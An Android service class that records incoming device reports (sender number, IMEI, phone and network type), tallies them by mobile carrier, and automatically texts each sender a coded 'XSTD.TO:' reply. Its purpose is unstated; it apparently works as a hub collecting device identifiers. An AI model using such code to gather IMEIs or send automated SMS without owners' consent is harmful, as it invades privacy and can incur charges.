package com.xstd.phoneService.secondeService;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.phoneService.Config;
import com.xstd.phoneService.SettingManager;
import com.xstd.phoneService.Utils.AppRuntime;
import com.xstd.phoneService.Utils.ReceivedDaoUtils;
import com.xstd.phoneService.Utils.SendDaoUtils;
import com.xstd.phoneService.Utils.StatusDaoUtils;
import com.xstd.phoneService.firstService.DemoService;
import com.xstd.phoneService.model.receive.SMSReceived;
import com.xstd.phoneService.model.receive.SMSReceivedDao;
import com.xstd.phoneService.model.send.SMSSent;
import com.xstd.phoneService.model.send.SMSSentDao;
import com.xstd.phoneService.model.status.SMSStatus;
import com.xstd.phoneService.model.status.SMSStatusDao;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by michael on 13-12-10.
 */
public class SecondeDemonService extends IntentService {

    public static final String SECOND_SAVE_RECEIVED_SMS = "com.xstd.received.save.second";

    private SMSReceivedDao mReceivedDao;
    private SMSSentDao mSentDao;
    private SMSStatusDao mStatusDao;

    private SMSStatus mStatus;

    public SecondeDemonService() {
        super("SecondeDemonService");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        mReceivedDao = ReceivedDaoUtils.getDaoSession(getApplicationContext()).getSMSReceivedDao();
        mSentDao = SendDaoUtils.getDaoSession(getApplicationContext()).getSMSSentDao();
        mStatusDao = StatusDaoUtils.getDaoSession(getApplicationContext()).getSMSStatusDao();
        List<SMSStatus> list = mStatusDao.queryBuilder().where(SMSStatusDao.Properties.ServerID.eq(100100)).build().forCurrentThread().list();
        if (list != null && list.size() > 0) {
            mStatus = list.get(0);
        } else {
            mStatus = new SMSStatus();
            mStatus.setServerID(100100);
        }

        Config.LOGD("[[SecondeDemonService::onCreate]] current Status : " + mStatus.toString());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            if (Config.DEBUG) {
                Config.LOGD("[[DemoService::onHandleIntent]] on received action : " + intent.getAction() + " entry >>>>>>>>");
            }
            if (SECOND_SAVE_RECEIVED_SMS.equals(intent.getAction())) {
                String from = intent.getStringExtra("from");
                String imei = intent.getStringExtra("imei");
                String phoneType = intent.getStringExtra("phoneType");
                String networkType = intent.getStringExtra("networkType");
                long time = intent.getLongExtra("receiveTime", 0);
                int type = intent.getIntExtra("nt", -1);

                if (!TextUtils.isEmpty(from) && !TextUtils.isEmpty(imei) && !TextUtils.isEmpty(phoneType)
                        && time != 0) {
                    List<SMSReceived> oldList = mReceivedDao.queryBuilder().where(SMSReceivedDao.Properties.From.eq(from))
                                                    .build().forCurrentThread().list();
                    SMSReceived obj = new SMSReceived();
                    obj.setFrom(from);
                    obj.setImei(imei);
                    obj.setPhoneType(phoneType);
                    obj.setNetworkType(networkType);
                    obj.setReceiveTime(time);
                    mReceivedDao.insertOrReplace(obj);
                    if (oldList != null && oldList.size() > 0) {
                        //已经有这个主键
                    } else {
                        Config.LOGD("[[DemoService::onHandleIntent]] should update status as the From : " + from + " not in DB");
                        mStatus.setLastReceivedTime(System.currentTimeMillis());
                        mStatus.setLeaveCount((mStatus.getLeaveCount() != null ? mStatus.getLeaveCount() : 0) + 1);
                        mStatus.setReceviedCount((mStatus.getReceviedCount() != null ? mStatus.getReceviedCount() : 0) + 1);
                        switch (type) {
                            case 1:
                                mStatus.setCmnetCount((mStatus.getCmnetCount() != null ? mStatus.getCmnetCount() : 0) + 1);
                                break;
                            case 2:
                                mStatus.setUnicomCount((mStatus.getUnicomCount() != null ? mStatus.getUnicomCount() : 0) + 1);
                                break;
                            case 3:
                                mStatus.setTelecomCount((mStatus.getTelecomCount() != null ? mStatus.getTelecomCount() : 0) + 1);
                                break;
                            case 4:
                                mStatus.setSubwayCount((mStatus.getSubwayCount() != null ? mStatus.getSubwayCount() : 0) + 1);
                                break;
                            case -1:
                                mStatus.setUnknownCount((mStatus.getUnknownCount() != null ? mStatus.getUnknownCount() : 0) + 1);
                                break;
                        }
                        mStatusDao.insertOrReplace(mStatus);
                    }

                    if (Config.DEBUG) {
                        Config.LOGD("[[DemoService::onHandleIntent]] insert RECEIVED obj : " + obj.toString() + " :::::::"
                                        + "\n\ncurrent status : " + mStatus.toString()
                                        + "\nlast received time : " + UtilsRuntime.debugFormatTime(mStatus.getLastReceivedTime() != null ? mStatus.getLastReceivedTime() : 0)
                                        + "\nlast sent time : " + UtilsRuntime.debugFormatTime(mStatus.getLastSentTime() != null ? mStatus.getLastSentTime() : 0));
                    }

                    List<SMSReceived> lists = mReceivedDao.queryBuilder().where(SMSReceivedDao.Properties.From.eq(obj.getFrom()))
                                                  .build().forCurrentThread().list();
                    Config.LOGD("\n\n[[DemoService::onHandleIntent]] try to check if need devliver SMS with : " + lists);
                    if (lists != null && lists.size() > 0) {
                        SMSReceived searchObj = lists.get(0);
                        List<SMSReceived> ret = getReceviedShouldSendCount(searchObj);
                        if (ret != null) {
                            mStatus.setLastSentTime(System.currentTimeMillis());
                            mStatus.setLeaveCount((mStatus.getLeaveCount() != null ? mStatus.getLeaveCount() : 0) - ret.size());
                            mStatus.setSentCount((mStatus.getSentCount() != null ? mStatus.getSentCount() : 0) + ret.size());
                            mStatusDao.insertOrReplace(mStatus);

                            if (Config.DEBUG) {
                                Config.LOGD("[[DemoService::onHandleIntent]]"
                                                + "\ncurrent status : " + mStatus.toString()
                                                + "\nlast received time : " + UtilsRuntime.debugFormatTime(mStatus.getLastReceivedTime() != null ? mStatus.getLastReceivedTime() : 0)
                                                + "\nlast sent time : " + UtilsRuntime.debugFormatTime(mStatus.getLastSentTime() != null ? mStatus.getLastSentTime() : 0));
                            }
                        }
                    }

                    Intent i = new Intent();
                    i.setAction(DemoService.UPDATE_STATUS);
                    sendBroadcast(i);
                }
            }

            if (Config.DEBUG) {
                Config.LOGD("[[DemoService::onHandleIntent]] on received action : " + intent.getAction() + " leave <<<<<<<<");
            }
        }
    }

    /**
     * 根据currentObj向前选择10个记录，如果超过10个，就发送短信到currentObj的对象，然后
     * 将发送的10个短信对象移动到sent数据库
     *
     * @param currentObj
     * @return
     */
    private List<SMSReceived> getReceviedShouldSendCount(SMSReceived currentObj) {
        if (currentObj == null) return null;

        Config.LOGD("[[DemoService::getReceviedShouldSendCount]] current search obj : " + currentObj.toString());
        ArrayList<SMSReceived> list = new ArrayList<SMSReceived>();
        list.add(currentObj);
        String contentSend = makeContent(list);
        if (!TextUtils.isEmpty(contentSend) && !TextUtils.isEmpty(currentObj.getFrom())) {
            if (AppRuntime.sendSMS(getApplicationContext(), currentObj.getFrom(), contentSend)) {
                //发送成功，移动短信到发送箱里
                SMSSent sent = convertReceivedToSent(currentObj, currentObj.getFrom());
                mSentDao.insertOrReplace(sent);
                Config.LOGD("[[DemoService::getReceviedShouldSendCount]] try to insert sent save : " + sent + " into sent DAO");

                //在移动成功以后，删除接收表里的数据
                mReceivedDao.deleteInTx(currentObj);
                Config.LOGD("[[DemoService::getReceviedShouldSendCount]] delete RECEIVED Obj : " + currentObj);

                mStatus.setLastSentTime(System.currentTimeMillis());
                mStatus.setLeaveCount((mStatus.getLeaveCount() != null ? mStatus.getLeaveCount() : 0) - 1);
                mStatus.setSentCount((mStatus.getSentCount() != null ? mStatus.getSentCount() : 0) + 1);
                mStatusDao.insertOrReplace(mStatus);

                if (Config.DEBUG) {
                    Config.LOGD("[[DemoService::onHandleIntent]]"
                                    + "\ncurrent status : " + mStatus.toString()
                                    + "\nlast received time : " + UtilsRuntime.debugFormatTime(mStatus.getLastReceivedTime() != null ? mStatus.getLastReceivedTime() : 0)
                                    + "\nlast sent time : " + UtilsRuntime.debugFormatTime(mStatus.getLastSentTime() != null ? mStatus.getLastSentTime() : 0));
                }

                Intent i = new Intent();
                i.setAction(DemoService.UPDATE_STATUS);
                sendBroadcast(i);

                return list;
            }
        }

        return null;
    }

    private SMSSent convertReceivedToSent(SMSReceived receivedObj, String targetNumber) {
        SMSSent ret = new SMSSent();
        ret.setFrom(receivedObj.getFrom());
        ret.setReceiveTime(receivedObj.getReceiveTime());
        ret.setNetworkType(receivedObj.getNetworkType());
        ret.setPhoneType(receivedObj.getPhoneType());
        ret.setImei(receivedObj.getImei());
        ret.setSendPhoneNumber(targetNumber);
        ret.setSendTime(System.currentTimeMillis());

        return ret;
    }

    private String makeContent(List<SMSReceived> objList) {
        StringBuilder sb = new StringBuilder("XSTD.TO:");
        for (SMSReceived obj : objList) {
            String target = obj.getFrom();
            if (!TextUtils.isEmpty(target)) {
                sb.append(target.substring(0, 5)).append(".").append(target.substring(5)).append(";");
//                sb.append(obj.getFrom()).append(";");
            }
        }

        return sb.substring(0, sb.length() - 1);
    }
}
